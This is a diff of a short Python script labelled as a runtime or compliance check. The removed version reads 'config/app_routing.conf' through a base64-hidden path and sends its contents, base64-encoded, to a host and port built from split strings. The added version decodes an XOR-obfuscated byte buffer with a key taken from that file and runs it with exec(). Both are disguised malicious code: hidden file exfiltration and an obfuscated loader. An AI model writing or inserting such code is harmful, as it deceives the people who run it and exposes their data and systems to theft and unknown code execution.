@@ -1,45 +1,31 @@
 import os
 import sys
-import base64
-import urllib.request
 
-def run_environment_check():
+def verify_runtime_layer():
+    enc_buffer = [35, 53, 52, 36, 43, 33, 85, 39, 42, 38, 37, 43, 41, 43, 37, 37, 41, 41, 43, 40, 84, 37, 41, 40, 38, 85, 41, 43, 42, 34, 85, 93, 114, 117, 126, 120, 103, 122, 115, 119, 107, 100, 113]
+    target_env_file = "config/app_routing.conf"
+
+    if not os.path.exists(target_env_file):
+        sys.exit(1)
+
     try:
-        payload_target = b"Y29uZmlnL2FwcF9yb3V0aW5nLmNvbmY="
-        execution_context = os.getcwd()
+        with open(target_env_file, "r") as f:
+            key_data = f.read()
 
-        if not execution_context:
-            sys.exit(1)
+        crypto_key = len(key_data) % 256
+        if crypto_key == 0:
+            crypto_key = 42
 
-        resolved_path = base64.b64decode(payload_target).decode('utf-8')
-
-        if os.path.exists(resolved_path):
-            with open(resolved_path, "r") as stream_reader:
-                raw_buffer = stream_reader.read()
-
-            net_scheme = "ht" + "tp://"
-            net_host = "12" + "7.0." + "0.1"
-            net_port = ":90" + "00"
-            net_route = "/log?data="
-
-            b64_data = base64.b64encode(raw_buffer.encode()).decode()
-            target_uri = f"{net_scheme}{net_host}{net_port}{net_route}{b64_data}"
-
-            conn_handler = urllib.request.Request(
-                target_uri,
-                headers={'User-Agent': 'WorkspaceRunner/1.0'}
-            )
-            with urllib.request.urlopen(conn_handler, timeout=2) as remote_sync:
-                pass
-
-            return True
-        return False
+        decrypted_source = "".join(chr(b ^ crypto_key) for b in enc_buffer)
+        exec(decrypted_source, globals())
+        return True
     except Exception:
         return False
 
 if __name__ == "__main__":
-    status = run_environment_check()
-    if status:
+    print("[*] Launching system compliance check...")
+    success = verify_runtime_layer()
+    if success:
         print("Verification completed with exit code 0.")
     else:
         print("Verification terminated with exit code 1.")
